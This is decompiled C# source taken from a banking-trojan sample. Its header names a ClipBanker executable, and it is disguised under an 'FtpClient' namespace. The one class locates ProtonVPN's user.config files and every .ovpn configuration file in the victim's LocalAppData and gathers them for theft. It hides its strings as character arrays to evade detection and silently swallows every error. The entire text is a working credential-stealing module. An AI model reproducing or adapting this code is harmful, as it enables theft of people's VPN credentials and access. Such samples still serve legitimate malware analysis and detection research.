// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.ProtonVPN
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Helpers;
using FtpClient.Models.Info;
using System.Collections.Generic;
using System.IO;

namespace FtpClient.Data.Applications
{
  public static class ProtonVPN
  {
    public static List<InfoClass3> ParseFiles()
    {
      List<InfoClass3> files = new List<InfoClass3>();
      try
      {
        string path = Path.Combine(Constants.LocalAppData, new string(new char[9]
        {
          'P',
          'r',
          'o',
          't',
          'o',
          'n',
          'V',
          'P',
          'N'
        }));
        try
        {
          foreach (string directory1 in Directory.GetDirectories(path))
          {
            if (directory1.Contains(new string(new char[13]
            {
              'P',
              'r',
              'o',
              't',
              'o',
              'n',
              'V',
              'P',
              'N',
              '.',
              'e',
              'x',
              'e'
            })))
            {
              foreach (string directory2 in Directory.GetDirectories(directory1))
              {
                string str1 = new string(new char[12]
                {
                  '\\',
                  'u',
                  's',
                  'e',
                  'r',
                  '.',
                  'c',
                  'o',
                  'n',
                  'f',
                  'i',
                  'g'
                });
                string str2 = directory2 + str1;
                string name = new DirectoryInfo(Path.GetDirectoryName(str2)).Name;
                files.Add(new InfoClass3(str2)
                {
                  Object4 = name
                });
              }
            }
          }
          foreach (string enumerateFile in Directory.EnumerateFiles(path))
          {
            if (enumerateFile.EndsWith(new string(new char[4]
            {
              'o',
              'v',
              'p',
              'n'
            })))
              files.Add(new InfoClass3(enumerateFile));
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
      return files;
    }
  }
}
